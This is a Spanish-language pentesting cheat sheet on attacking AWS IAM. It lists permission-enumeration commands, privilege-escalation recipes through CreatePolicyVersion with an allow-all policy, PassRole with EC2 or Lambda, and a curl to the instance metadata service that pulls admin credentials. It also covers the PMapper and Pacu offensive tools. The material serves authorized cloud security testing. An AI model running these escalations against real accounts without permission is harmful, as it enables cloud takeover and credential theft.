# Ataques a IAM (Identity and Access Management)

IAM es el sistema de control de acceso de los proveedores cloud.
Un IAM mal configurado es la puerta de entrada a toda la infraestructura.

---

## Enumeracion de permisos IAM (AWS)

```bash
# Quien soy
aws sts get-caller-identity

# Mis politicas
aws iam list-attached-user-policies --user-name $(aws iam get-user --query User.UserName --output text)
aws iam list-user-policies --user-name MI_USUARIO

# Ver el contenido de las politicas
aws iam get-user-policy --user-name MI_USUARIO --policy-name POLITICA

# enumerate-iam -- fuerza bruta de permisos (util si no puedes listar politicas)
python3 enumerate-iam.py --access-key AKID --secret-key SECRET --region eu-west-1
```

---

## Escalada de privilegios IAM

### Via iam:CreatePolicyVersion

```bash
# Si tienes iam:CreatePolicyVersion sobre una politica existente
# Crear nueva version con AdministratorAccess
aws iam create-policy-version     --policy-arn ARN_POLITICA     --policy-document file://admin_policy.json     --set-as-default

# admin_policy.json:
# {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
```

### Via iam:PassRole + ec2:RunInstances

```bash
# 1. Crear instancia con un rol de DA
aws ec2 run-instances     --image-id ami-XXXX     --instance-type t2.micro     --iam-instance-profile Name=ROL_ADMINISTRADOR

# 2. Conectar a la instancia
# 3. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROL_ADMINISTRADOR
# 4. Tienes credenciales de administrador
```

### Via lambda:CreateFunction + iam:PassRole

```bash
# Crear funcion Lambda con rol privilegiado
aws lambda create-function     --function-name privesc     --runtime python3.9     --role ARN_ROL_ADMIN     --handler index.handler     --zip-file fileb://function.zip

# La funcion puede ejecutar cualquier llamada AWS con el rol de admin
```

---

## Herramienta: PMapper

```bash
pip install principalmapper

# Crear grafo de relaciones IAM
pmapper --profile default graph create

# Buscar rutas de escalada de privilegios
pmapper --profile default analysis --privesc

# Quien puede llegar a ser admin
pmapper --profile default query "who can assume ADMIN_ROLE_ARN"
```

---

## Herramienta: Pacu

```bash
pip install pacu
pacu

# Comandos utiles:
> whoami
> run iam__enum_users_roles_policies_groups
> run iam__privesc_scan
> run s3__bucket_finder
> run lambda__enum
```
